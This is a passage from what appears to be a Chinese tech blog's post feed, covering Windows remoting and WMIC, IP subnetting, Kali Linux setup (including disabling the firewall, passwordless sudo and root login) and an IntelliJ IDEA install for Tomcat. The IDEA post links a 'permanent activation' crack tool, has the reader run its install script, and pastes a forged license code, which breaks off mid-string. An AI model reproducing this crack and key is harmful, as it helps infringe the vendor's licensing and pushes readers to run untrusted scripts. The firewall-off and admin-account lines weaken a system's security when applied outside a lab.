在windows系统中，<strong>线程的id是唯一对应的</strong>，也就是说，如果两个线程返回相同的id,则他们必然是同一线程，反之一定是不同的线程。<strong>而线程的句柄并不是线程的唯一标识</strong>，线程的句柄只是用来访问该线程的的一个32位值，尽管相同的句柄一定标识同一线程，但同一线程可能拥有两个打开的句柄，因此，不能用句柄来区分两个线程是否是同一线程。</p><p><strong>为什么我们需要句柄？</strong><br>更准确地说，是windows需要句柄。windows需要向程序员提供必要地编程接口，在这些接口中，允许程序员访问、创建和销毁对象。但是，出于封装地考虑，windows并不想向程序员返回指针。指针包含了太多的信息。首先指针给出了对象存储的确切位置；其次，要操作一个指针，程序员必须知道指针所指对象的内部结构特征，也即，windows必须向程序员暴露相应的数据结构，而这些数据结构也许是操作系统想向程序员隐藏的。</p><h1 id="5-远程访问"><a href="#5-远程访问" class="headerlink" title="5 远程访问"></a>5 远程访问</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Enter-PSSession A-2022-2 <span class="comment">#在同一个域内，直接就能远程到A-2022-2，不知道为什么server2022可以，win10不行</span></span><br><span class="line">Enter-PSSession A-2022-2 -Credential (Get-Credential) <span class="comment">#需要输入账号密码的连接方式</span></span><br></pre></td></tr></table></figure><p><img src="/img/20230205113152.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-Command -ComputerName A-2022-2 -ScriptBlock &#123;Get-Process&#125;</span><br><span class="line">Invoke-Command -ComputerName A-2022-2,A-2022-1 -ScriptBlock &#123;Get-Process&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/20230205113749.png"></p><h1 id="6-wmic命令"><a href="#6-wmic命令" class="headerlink" title="6 wmic命令"></a>6 wmic命令</h1><p>windows Management Instrumentation (WMI) 是在基于 Windows 的操作系统上管理数据和操作的基础结构。</p><p>可以编写 WMI 脚本或应用程序来自动执行远程计算机上的管理任务。</p><p>查看已安装补丁。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic qfe list</span><br></pre></td></tr></table></figure><p>查看已安装的软件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic product get name</span><br></pre></td></tr></table></figure><p>获取cpu核心数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic cpu get numberofcores</span><br></pre></td></tr></table></figure><p>获取bios版本信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic bios get version</span><br></pre></td></tr></table></figure><p>查看远程的那台机器有哪个用户在登录状态。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:远程机器的ip /user:用户名 /password:密码 computersystem get username</span><br></pre></td></tr></table></figure><p>获取所有运行进程的列表。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process list</span><br></pre></td></tr></table></figure><p>获取所有运行进程的id和文件路径。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic process get ProcessID,ExecutablePath</span><br></pre></td></tr></table></figure><h1 id="7-文件共享"><a href="#7-文件共享" class="headerlink" title="7 文件共享"></a>7 文件共享</h1><p>安装文件服务器，然后配置一下即可。</p><p><img src="/img/20230205120322.png"></p><h1 id="8-分析并设计架构"><a href="#8-分析并设计架构" class="headerlink" title="8 分析并设计架构"></a>8 分析并设计架构</h1><p>基于的windows的生态可以做的超级庞大，例如exchange、lync等服务，但由于我们的实验环境的限制，只将简单的生态进行模拟测试。</p><p><img src="/img/20230205120558.png"></p><h1 id="windows-常用命令"><a href="#windows-常用命令" class="headerlink" title="windows 常用命令"></a>windows 常用命令</h1><p><code>win+R</code>常用命令。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gpedit.msc     <span class="comment">#组策略</span></span><br><span class="line">explorer       <span class="comment">#打开资源管理器</span></span><br><span class="line">logoff         <span class="comment">#注销命令</span></span><br><span class="line">lusrmgr.msc    <span class="comment">#本机用户和组</span></span><br><span class="line">services.msc   <span class="comment">#本地服务设置</span></span><br><span class="line">compmgmt.msc   <span class="comment">#计算机管理</span></span><br></pre></td></tr></table></figure><p><code>cmd</code>常用命令。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping ip(或域名)                                          <span class="comment">#向对方主机发送默认大小为32字节的数据</span></span><br><span class="line">net user 用户名 密码 /add                                 <span class="comment">#建立用户</span></span><br><span class="line">net user 用户名 /active:<span class="built_in">yes</span>                              <span class="comment">#激活用户</span></span><br><span class="line">net user                                                <span class="comment">#查看有哪些用户</span></span><br><span class="line">net localgroup administrators 用户名 /add                <span class="comment">#把用户添加到管理员中使其具有管理员权限</span></span><br><span class="line">net start                                               <span class="comment">#查看开启了哪些服务</span></span><br><span class="line">netstat -a                                              <span class="comment">#查看开启了哪些端口,常用netstat -an</span></span><br><span class="line">tasklist                                                <span class="comment">#查看进程，跟任务管理器效果一样，相当于linux的ps -aux</span></span><br><span class="line">arp                                                     <span class="comment">#查看和处理ARP缓存</span></span><br><span class="line">NetSh Advfirewall <span class="built_in">set</span> allprofiles state off             <span class="comment">#关闭防火墙</span></span><br><span class="line">Netsh Advfirewall show allprofiles                      <span class="comment">#查看防火墙状态</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP地址与子网掩码</title>
      <link href="/2023/03/16/IP%E5%9C%B0%E5%9D%80%E4%B8%8E%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81/"/>
      <url>/2023/03/16/IP%E5%9C%B0%E5%9D%80%E4%B8%8E%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>局域网：一般称为内网。<br>简单局域网的构成：交换机、网线、pc<br>交换机：用来组建内网的局域网的设备</p><p>IP地址：x.x.x.x   x的范围是0-225</p><p>局域网通信规则：在同一个局域网中，所有的IP必须在同一网段中才可以互相通信。<br>IP地址构成：网络位+主机位（网络位相同的IP地址，为同一网段）<br>子网掩码：用来确定IP地址的网络位<br>子网掩码如何确认网络位：与255对应的数字为网络位，与0对应的数字为主机位<br>255.0.0.0<br>255.255.0.0<br>255.255.255.0<br>例如：<br>10.1.1.1   255.0.0.0<br>获知：10.1.1.1属于10.网段，主机名字叫.1.1.1<br>10.1.1.1   255.255.0.0<br>获知：10.1.1.1属于10.1.网段，主机名字叫.1.1<br>10.1.1.1   255.255.255.0<br>获知：10.1.1.1属于10.1.1网段，主机名字叫.1<br>国际标准组织ISO定义地址分类：五大类（是以IP地址的第一位进行分区的）<br>A类：1-126默认子网掩码225.0.0.0<br>B类：128-191默认子网掩码225.225.0.0<br>C类：192-223默认子网掩码225.225.225.0<br>D类：224-239组播地址<br>E类：240-254科研使用<br>127.0.0.1回环地址，代表自己，每一个电脑都有，经常用于测试<br>可以测网卡有没有损坏，如果能ping到这个地址就是没坏</p><p>虚拟机网络配适器自定义的特定虚拟网络相当于交换机<br>案例1：<br>10.1.1.1<br>255.255.255.0<br>问：10.1.1.1属于哪个网段？该网段的广播地址是什么？<br>答：属于10.1.1.0网段，广播地址是10.1.1.255<br>主机位不能全为0也不能全为255<br>主机位全为0代表网段，全为255代表广播地址<br>网关：一个网络出口，Gateway&#x3D;GW，一般网关是在路由器上<br>路由器：可用连接内外网的设备<br>网关的IP一般是该网段的第一个或最后一个，例如：10.1.1.1或10.1.1.254<br>一个地址向另一个发送数据包思想活动步骤：<br>1.自己IP与目标IP比较是否在同一网段<br>2.如果在同一网段，则直接发出去，不经过网关<br>3.如果不在同一网段，则直接发包给网关<br>DNS：Domain Name Service域名服务器<br>访问一个域名先求助于DNS缓存，如果没有访问过该域名则求助于DNS服务器解析<br>最好使用本地区的DNS服务器，比较快<br>114.114.114.114是全国通用的DNS服务器<br>nslookup查看该域名的IP  手动解析域名<br>ping 目标IP地址   #测试网络的连通性<br>ping -t 目标IP地址   #一直ping<br>ping -n 数字 目标IP地址    #修改发送的包数<br>ping -l  数字 目标IP地址    #修改一个ping包的字节数  0~65500<br>如果ping不通，可能对方不在线，或者对方开着防火墙<br>有些防火墙默认可以ping，有些防火墙默认不可以ping<br>ipconfig    #查看IP地址基本信息<br>ipconfig  &#x2F;all     #查看IP地址详细信息<br>Mac地址即物理地址，绑定于网卡，全球唯一，十六进制<br>例如：6C-2B-59-75-3B-DE前三位是指Realtek公司，后三位是该厂家生产的该网卡的唯一编号<br>每生产一个网卡，后三位就加一，如果用完了厂家就向国际组织在申请一个前三位的标志</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali安装与配置</title>
      <link href="/2023/03/10/kali%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
      <url>/2023/03/10/kali%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="kali安装与配置"><a href="#kali安装与配置" class="headerlink" title="kali安装与配置"></a>kali安装与配置</h1><h1 id="1-下载kali"><a href="#1-下载kali" class="headerlink" title="1 下载kali"></a>1 下载kali</h1><p>访问官网地址 <a href="https://www.kali.org/get-kali">https://www.kali.org/get-kali</a> 。</p><p>下载。</p><p><img src="/img/image-20240511121304341.png" alt="image-20240511121304341"></p><h1 id="2-安装kali"><a href="#2-安装kali" class="headerlink" title="2 安装kali"></a>2 安装kali</h1><p>打开kali，账号密码都是kali。</p><h1 id="3-汉化kali"><a href="#3-汉化kali" class="headerlink" title="3 汉化kali"></a>3 汉化kali</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy</span><br><span class="line">sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p>空格键把下面这个 <code>*</code> 去掉。</p><p><img src="/img/image-20220608203352193.png" alt="image-20220608203352193"></p><p>选择下面这个。</p><p><img src="/img/20220608205336.png"></p><p>按回车键，选择 <code>zh_CN.UTF-8</code> 。</p><p><img src="/img/20220608205523.png"></p><p>再按回车键，然后重启kali，选择保留旧名字。</p><p><img src="/img/20220608205937.png"></p><h1 id="4-关闭屏保"><a href="#4-关闭屏保" class="headerlink" title="4 关闭屏保"></a>4 关闭屏保</h1><p><img src="/img/20220608210249.png"></p><p><img src="/img/20220608210401.png"></p><p><img src="/img/image-20220608210610687.png"></p><h1 id="5-文件互传"><a href="#5-文件互传" class="headerlink" title="5 文件互传"></a>5 文件互传</h1><p>安装虚拟机 <code>open-vm-tools-desktop</code> 模块。</p><p>此模块可以使物理机文件复制粘贴到kali，反之亦然。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fuse3</span><br><span class="line">sudo apt-get install open-vm-tools-desktop fuse3</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p><strong>遇到的问题：</strong> </p><p>一开始我直接用 <code>sudo apt-get install open-vm-tools-desktop fuse</code> 命令安装，报错：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">open-vm-tools-desktop : 依赖: fuse3 但是它将不会被安装</span><br><span class="line">无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系 解决办法。</span><br></pre></td></tr></table></figure><p>这表示 <code>open-vm-tools-desktop</code> 依赖 <code>fuse3</code>，但是有另一个东西依赖<code>fuse</code>，为了不破坏另一个东西的依赖关系，<code>apt-get</code>并不会自动把fuse升级为fuse3，所以需要先下载依赖的指定的版本 <code>sudo apt-get install fuse3</code>，再安装此模块。</p><p>我参考了CSDN大佬的方法 <a href="https://blog.csdn.net/smallmao/article/details/45626555">https://blog.csdn.net/smallmao/article/details/45626555</a>，下图是原文。</p><p><img src="/img/20220609103201.png"></p><h1 id="6-pip国内源"><a href="#6-pip国内源" class="headerlink" title="6 pip国内源"></a>6 pip国内源</h1><p>一些源</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install --upgrade pip    #更新pip</span><br><span class="line">pip3 install 库名 -i https://mirrors.cloud.tencent.com/pypi/simple #使用腾讯源安装库</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">其他国内源</span></span><br><span class="line">https://pypi.tuna.tsinghua.edu.cn/simple #清华</span><br><span class="line">https://pypi.mirrors.ustc.edu.cn/simple/ #中国科技大学</span><br><span class="line">https://mirrors.aliyun.com/pypi/simple/ #阿里</span><br><span class="line">http://pypi.douban.com/simple/ #豆瓣</span><br></pre></td></tr></table></figure><p>把国内源设置为默认源 </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip config set global.index-url http://mirrors.cloud.tencent.com/pypi/simple </span><br></pre></td></tr></table></figure><h1 id="7-更新系统源"><a href="#7-更新系统源" class="headerlink" title="7 更新系统源"></a>7 更新系统源</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak #备份原来的源</span><br><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>做如下修改，<code>i</code>键编辑，<code>Esc</code>退出编辑，<code>:wq</code>保存并退出。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p><img src="/img/20220609111428.png"></p><p>其他源。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">清华大学</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">浙大</span></span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure><p>更新命令。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update #更新清单</span><br><span class="line">sudo apt-get upgrade #升级已安装的所有软件包</span><br><span class="line">sudo apt-get dist-upgrade #升级软件 会自动处理依赖包</span><br></pre></td></tr></table></figure><h1 id="8-取消每次sudo输入密码"><a href="#8-取消每次sudo输入密码" class="headerlink" title="8 取消每次sudo输入密码"></a>8 取消每次sudo输入密码</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo visudo</span><br></pre></td></tr></table></figure><p>在最后一行加上</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali ALL=(ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure><h1 id="9-换成GNOME桌面"><a href="#9-换成GNOME桌面" class="headerlink" title="9 换成GNOME桌面"></a>9 换成GNOME桌面</h1><p><strong>方法一</strong></p><p>搜索kali的桌面，如果清单里没有gnome，就apt-get update更新清单。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt search kali-desktop</span><br></pre></td></tr></table></figure><p>然后执行tasksel选择gnome。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasksel</span><br></pre></td></tr></table></figure><p><strong>方法二</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install kali-desktop-gnome</span><br></pre></td></tr></table></figure><p>下载完选择gdm3。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update-alternatives --config x-session-manager</span><br></pre></td></tr></table></figure><p>选择gnome。</p><h1 id="10-安装星火应用商店"><a href="#10-安装星火应用商店" class="headerlink" title="10 安装星火应用商店"></a>10 安装星火应用商店</h1><p>注意：下面的步骤不要用root用户！</p><p><a href="https://www.spark-app.store/download%E4%B8%8B%E8%BD%BD%E8%BD%AF%E4%BB%B6%E6%9C%AC%E4%BD%93">https://www.spark-app.store/download下载软件本体</a></p><p>sudo dpkg -i spark-store_3.3.3_amd64.deb 会报错，不用担心，执行下一条命令</p><p>sudo apt install -f  补一下依赖</p><p>然后直接在应用程序里面搜spark，要是图标打不开，就用下面这条命令，能打开就算了。</p><p>saprk-store –no-sandx</p><h1 id="11-安装wine"><a href="#11-安装wine" class="headerlink" title="11 安装wine"></a>11 安装wine</h1><p><a href="https://wiki.winehq.org/Debian_zhcn">https://wiki.winehq.org/Debian_zhcn</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo wget -nc -O /usr/share/keyrings/winehq-archive.key https://dl.winehq.org/wine-builds/winehq.key</span><br><span class="line">sudo wget -nc -P /etc/apt/sources.list.d/ https://dl.winehq.org/wine-builds/debian/dists/bookworm/winehq-bookworm.sources</span><br><span class="line">sudo apt install --install-recommends winehq-stable</span><br><span class="line"><span class="comment">#https://segmentfault.com/a/1190000023476948?utm_source=tag-newest,libfaudio0依赖可以不安装</span></span><br><span class="line">wine --version</span><br></pre></td></tr></table></figure><h1 id="12-QQ快捷方式"><a href="#12-QQ快捷方式" class="headerlink" title="12 QQ快捷方式"></a>12 QQ快捷方式</h1><p>cd ~&#x2F;桌面</p><p>vi QQ.desktop</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Name=QQ</span><br><span class="line">Exec=wine /home/kali/.wine/dosdevices/c:/<span class="string">&#x27;Program Files (x86)&#x27;</span>/Tencent/QQ/Bin/QQ.exe</span><br><span class="line">Type=Application</span><br><span class="line">StartupNotify=<span class="literal">true</span></span><br><span class="line">Icon=/home/kali/图片/QQ.ico <span class="comment">#https://icon-icons.com/zh/，这是一个图标网站</span></span><br></pre></td></tr></table></figure><p>右键QQ桌面图标，点击允许运行。</p><p>添加到开始菜单：sudo cp QQ.desktop &#x2F;usr&#x2F;share&#x2F;applications</p><p>以上方法作废，现在QQ有Linux版了。</p><h1 id="13-AppImage快捷方式"><a href="#13-AppImage快捷方式" class="headerlink" title="13 AppImage快捷方式"></a>13 AppImage快捷方式</h1><p>cd &#x2F;usr&#x2F;share&#x2F;applications</p><p>sudo vi PicGo.desktop</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Type=Application</span><br><span class="line">Name=PicGo</span><br><span class="line">Icon=/home/kali/图片/PicGo.png</span><br><span class="line">Exec=/home/kali/文档/PicGo-2.3.1.AppImage</span><br></pre></td></tr></table></figure><p>给所有用户加上执行权限（可不做）：sudo chmod u+x  &#x2F;usr&#x2F;share&#x2F;applications&#x2F;PicGo.desktop</p><h1 id="14-配置Java8"><a href="#14-配置Java8" class="headerlink" title="14 配置Java8"></a>14 配置Java8</h1><p>sudo gedit ~&#x2F;.bashrc</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#java8</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/home/kali/java8/jdk1.8.0_351</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>source ~&#x2F;.bashrc</p><h2 id="给Java8配置序列号"><a href="#给Java8配置序列号" class="headerlink" title="给Java8配置序列号"></a>给Java8配置序列号</h2><p>update-alternatives 命令用于处理linux系统中软件版本的切换，在各个linux发行版中均提供了该命令，命令参数略有区别，但大致是一样的。</p><p>安装了jdk以后，先要在update-alternatives工具中注册；</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/kali/java8</span><br><span class="line">sudo update-alternatives --install /usr/bin/java java /home/kali/java8/jdk1.8.0_351/bin/java 1</span><br></pre></td></tr></table></figure><p>第一个参数<code>--install</code>表示向update-alternatives注册服务名。</p><p>第二个参数是注册最终地址，成功后将会把命令在这个固定的目的地址做真实命令的软链，以后管理就是管理这个软链；</p><p>第三个参数：服务名，以后管理时以它为关联依据。</p><p>第四个参数，被管理的命令绝对路径。</p><p>第五个参数，优先级，数字越大优先级越高。</p><p>查看已注册列表：<code>update-alternatives --display java</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java - auto/manual mode    <span class="comment">#默认为自动，根据优先级，使用优先级高的。</span></span><br></pre></td></tr></table></figure><p>交互式修改</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-alternatives --config java</span><br></pre></td></tr></table></figure><p>修改为自动</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-alternatives --auto java</span><br></pre></td></tr></table></figure><p>立即修改</p><p>除了交互式修改，也可以使用一条命令直接修改，修改后立即生效。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> java /home/kali/java8/jdk1.8.0_351/bin/java   <span class="comment">#该情形适用于你对路径很熟悉</span></span><br></pre></td></tr></table></figure><p>移除：<code>sudo update-alternatives --remove java /home/kali/java8/jdk1.8.0_351/bin/java</code> </p><h1 id="15-安装eclipse"><a href="#15-安装eclipse" class="headerlink" title="15 安装eclipse"></a>15 安装eclipse</h1><p><a href="https://www.eclipse.org/downloads/packages/">https://www.eclipse.org/downloads/packages/</a></p><p>sudo tar -zxvf eclipse-jee-2022-12-R-linux-gtk-x86_64.tar.gz -C &#x2F;home&#x2F;kali&#x2F; 文档</p><p>sudo gedit &#x2F;usr&#x2F;share&#x2F;applications&#x2F;eclipse.desktop</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Name=eclipse</span><br><span class="line">Comment=Eclipse IDE</span><br><span class="line">GenericName=eclipse</span><br><span class="line">Exec=/home/kali/文档/eclipse/eclipse</span><br><span class="line">Icon=/home/kali/文档/eclipse/icon.xpm</span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">StartupNotify=<span class="literal">true</span></span><br><span class="line">Categories=Application;Development;</span><br></pre></td></tr></table></figure><h1 id="16-开启root登录"><a href="#16-开启root登录" class="headerlink" title="16 开启root登录"></a>16 开启root登录</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -s #切换成root用户</span><br><span class="line">apt-get install kali-root-login #安装需要的包</span><br><span class="line">passwd #修改密码</span><br></pre></td></tr></table></figure><h1 id="kali开机报错"><a href="#kali开机报错" class="headerlink" title="kali开机报错"></a>kali开机报错</h1><p>我在物理机安装了kali，开机显示如下报错内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x86/cpu: sgx disabled by bios.</span><br><span class="line">busybox v1.35.0(debian 1:1.35.0-1)built-in shell (ash)</span><br></pre></td></tr></table></figure><p><strong>解决办法</strong></p><p>一开始我按照网上的教程使用fsck -y &#x2F;dev&#x2F;sda2和fsck -y &#x2F;dev&#x2F;sda2命令来修复这个错误。但是没用。</p><p>然后我exit就出现了提示需要修复的为sda7。</p><p>使用命令fsck -y &#x2F;dev&#x2F;sda7后会出现一大串修复信息，最后修复成功。</p><p>然后输入exit系统正常启动了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idea部署tomcat项目</title>
      <link href="/2023/02/25/idea%E9%83%A8%E7%BD%B2tomcat%E9%A1%B9%E7%9B%AE/"/>
      <url>/2023/02/25/idea%E9%83%A8%E7%BD%B2tomcat%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="1-安装java"><a href="#1-安装java" class="headerlink" title="1.安装java"></a>1.安装java</h1><p>java 8安装包：<a href="https://www.aliyundrive.com/s/FmeWnLMFRD4">https://www.aliyundrive.com/s/FmeWnLMFRD4</a></p><p>一路默认安装即可。</p><p><strong>配置环境变量</strong> </p><p>在设置里面搜索高级系统，点击查看高级系统设置。</p><p><img src="/img/20230212151722.png"></p><p>新建JAVA_HOME变量，填入jdk的路径C:\Program Files\Java\jdk1.8.0_361</p><p><img src="/img/20230212151951.png"></p><p>在Path变量添加路径%JAVA_HOME%\bin和%JAVA_HOME%\jre\bin</p><p><img src="/img/20230212152305.png"></p><p><img src="/img/20230212152441.png"></p><p>检查环境变量是否配置成功。</p><p><img src="/img/20230212152557.png"></p><h1 id="2-安装idea"><a href="#2-安装idea" class="headerlink" title="2.安装idea"></a>2.安装idea</h1><p>idea软件：<a href="https://www.aliyundrive.com/s/xZgCavYvqdd">https://www.aliyundrive.com/s/xZgCavYvqdd</a></p><p>idea永久激活工具：<a href="https://www.aliyundrive.com/s/pRJq7nTvYD6%EF%BC%8C%E8%AF%B7%E6%8A%8Aidea-jihuo%E6%94%BE%E5%88%B0%E8%8B%B1%E6%96%87%E8%B7%AF%E5%BE%84%E4%B8%8B%E3%80%82">https://www.aliyundrive.com/s/pRJq7nTvYD6，请把idea-jihuo放到英文路径下。</a></p><p>我在虚拟机安装，只有c盘，就默认路径了。</p><p><img src="/img/20230212143931.png"></p><p>只勾选“创建桌面快捷方式”即可。</p><p><img src="/img/20230212153630.png"></p><p>勾选运行idea，点击Finish。</p><p><img src="/img/20230212154246.png"></p><p>勾选我同意，继续。</p><p><img src="/img/20230212154435.png"></p><p>选择不发送使用数据。</p><p><img src="/img/20230212154545.png"></p><p><strong>永久激活idea</strong> </p><p>运行idea-jihuo\scripts\install-current-user.vbs脚本，点击确定。</p><p><img src="/img/20230212154854.png"></p><p>再次点击确定。</p><p><img src="/img/20230212154917.png"></p><p>重启idea，复制下方的激活码，粘贴到Activation code中。然后点击activate。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XIZQAN09CR-eyJsaWNlbnNlSWQiOiJYSVpRQU4wOUNSIiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IlBEQiIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFNJIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUEMiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBDV01QIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUkIiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBQUyIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiSUkiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJQR08iLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBTVyIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFdTIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfV0sIm1ldGFkYXRhIjoiMDEyMDIyMDgwMVBTQU4wMDAwMDUiLCJoYXNoIjoiVFJJQUw6LTEwMzUwMzQyMiIsImdyYWNlUGVyaW9kRGF5cyI6NywiYXV0b1Byb2xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlfQ==-CoFOL4hCLVDFAdlOcxtyff4LA+HU4DIoRo+QTdjWbEuevzCGrh4ghKPWTCWT7YdMYoaaLGQfpR7DP8I2w4AxRMBH5T/KEUeNM70uTkdzIXboS460xZGLImtcte5hiD/U6k3P6NL2BVQgQwGTMRG5utlGdj1WtF/jb+yzp7+vaJiCt8uqqqXjEohapQsROTUihqtVRVkd9peAtS1gzKc39YEMnxu7Oggjuo797zMSnSswT5b4EVjgs+GJxL8RObb1o5xnKk8z4fCSRzVXD4tcVbwMXs/OVcr9+cgUYMiRCLhlHVOQJtb8F5r3IFYKFEPCPmwVAFHfmkMxC3uVmAcVsg==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwgg